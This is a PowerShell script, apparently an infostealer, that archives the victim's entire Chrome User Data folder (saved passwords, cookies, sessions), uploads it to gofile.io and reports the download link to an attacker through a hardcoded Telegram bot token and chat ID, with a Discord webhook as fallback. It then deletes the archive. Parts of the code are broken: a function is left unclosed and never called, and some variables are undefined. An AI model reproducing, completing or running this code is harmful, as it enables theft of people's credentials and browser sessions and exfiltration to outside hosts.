 $botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"
 $chatID = "8121448802"

# Function for sending messages through Telegram Bot
function Send-TelegramMessage {
    param (
        [string]$message
    )

    if ($botToken -and $chatID) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{
            chat_id = $chatID
            text = $message
        }

        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        } catch {
            Write-Host "Failed to send message to Telegram: $_"
        }
    } else {
        Send-DiscordMessage -message $message
    }
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

 function Upload-ToGofileV2 {
    param (
        [Parameter(Mandatory = $true)]
        [string]$filePath,

        [Parameter(Mandatory = $true)]
        [string]$token  # gofile API token
    )

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    if (-not (Test-Path $filePath)) {
        Write-Host "File not found: $filePath"
        return $null
    }

    $uri = "https://api.gofile.io/contents/uploadFile"

    try {
        
        $form = New-Object System.Net.Http.MultipartFormDataContent
        
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new("application/octet-stream")


        $form.Add($fileContent, "file", [System.IO.Path]::GetFileName($filePath))


        $form.Add((New-Object System.Net.Http.StringContent($token)), "token")

        $http = New-Object System.Net.Http.HttpClient
        $res = $http.PostAsync($uri, $form).Result
        $json = $res.Content.ReadAsStringAsync().Result | ConvertFrom-Json

        if ($json.status -ne "ok") {
            Write-Host "Upload failed: $($json.status)"
            return $null
        }

        return $json.data.downloadPage
    }
    catch {
        Write-Host "Error uploading: $_"
        return $null
    }
}
   
# Check for 7zip path
$zipExePath = "C:\Program Files\7-Zip\7z.exe"
if (-not (Test-Path $zipExePath)) {
    $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-TelegramMessage -message "Chrome User Data path not found!"
    exit
}

# Exit if 7zip path not found
if (-not (Test-Path $zipExePath)) {
    Send-TelegramMessage -message "7Zip path not found!"
    exit
}

# Create a zip of the Chrome User Data
$outputZip = "$env:TEMP\chrome_data.zip"
& $zipExePath a -r $outputZip $chromePath
if ($LASTEXITCODE -ne 0) {
    Send-TelegramMessage -message "Error creating zip file with 7-Zip"
    exit
}

# Upload the file and get the link
$link = Upload-FileAndGetLink -filePath $outputZip

# Check if the upload was successful and send the link via Telegram
if ($link -ne $null) {
    Send-TelegramMessage -message "Download link: $link"
} else {
    Send-TelegramMessage -message "Failed to upload file to gofile.io"
}

# Remove the zip file after uploading
Remove-Item $outputZip
